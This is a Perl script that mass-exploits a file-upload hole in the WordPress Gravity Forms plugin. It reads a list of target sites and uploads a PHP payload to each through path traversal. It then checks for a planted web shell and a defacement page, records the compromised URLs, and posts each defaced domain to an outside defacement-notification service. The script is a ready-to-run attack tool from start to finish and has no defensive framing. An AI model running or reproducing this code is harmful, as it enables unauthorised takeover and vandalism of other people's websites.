#!/usr/bin/perl -U

use HTTP::Request;
use LWP::UserAgent;
use IO::Select;
use HTTP::Response;

system(($^O eq 'MSWin32') ? 'cls' : 'clear');


my $usage = " \nperl $0 <list.txt>\n perl $0 seif.txt";
die "$usage" unless $ARGV[0];

open(tarrget,"<$ARGV[0]") or die "$!";
while(<tarrget>){
chomp($_);
$target = $_;
my $path = "/?gf_page=upload";

print "\nTarget => $target\n";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$target/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["seif.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "dz.php5"]);
print "  [*] Sent payload\n";
if ($exploit->decoded_content =~ /_input_3_dz.php5/) {
	print "  [+] Payload successfully executed\n";
	print "  [+] Lib Uploaded\n";
	open(save, '>>seif-gravity.txt');
	
    print save "$target/wp-content/uploads/_input_3_dz.php5\n";
	
    close(save);


my $check = $ua->get("$target/wp-content/uploads/_input_3_dz.php5")->content;
my $checkk = $ua->get("$target/wp-admin/seif.php")->content;
if($checkk =~/EditioN/) {
print "  [+] Shell Uploaded\n";

    open(save, '>>seif-Shells.txt');
	
    print save "$target/wp-admin/gozi.php\n";
	
    close(save);
}
    my $checkkk = $ua->get("$target/gozi.html")->content;
    if($checkkk =~m/abramas/i) {
  
		print "  [+] Defaced \n";
		
        
	$Dom="$target/gozi.html";
				$Def="gozi Creators";
				if ($Dom =~ /http:\/\//)
				{
				$U="http://hhh-h.org/notify/single";
				$lwp=LWP::UserAgent->new;
                #$lwp->proxy(['http'] => 'http://218.204.140.97:8118');
				$res=$lwp  -> post($U,[
				'defacer'     => $Def,
				'domain1'   => $Dom,
				'hackmode' => '15',
				'reason'       => '1',
				'submit'       => 'Send',
				]);
				if ($res->content =~ /color="red">(.*)<\/font><\/li>/) {
				print " [Zone] $target submit $1\n";
				open(save, '>>Notified-Succcess.txt');
        print save "$target/gozi.html\n";
        close(save);
				}
				else
				{
				print " [Zone] $target Error\n";
				open(save, '>>Notified-False.txt');
        print save "$target/nktt.html\n";
        close(save);
				}
	
	} 
}
	else 
	{ 
	
	print "  [-] Deface Failed\n"; 
	
	}
	
}
else { print "  [-] $target NOT Vuln\n";}

}
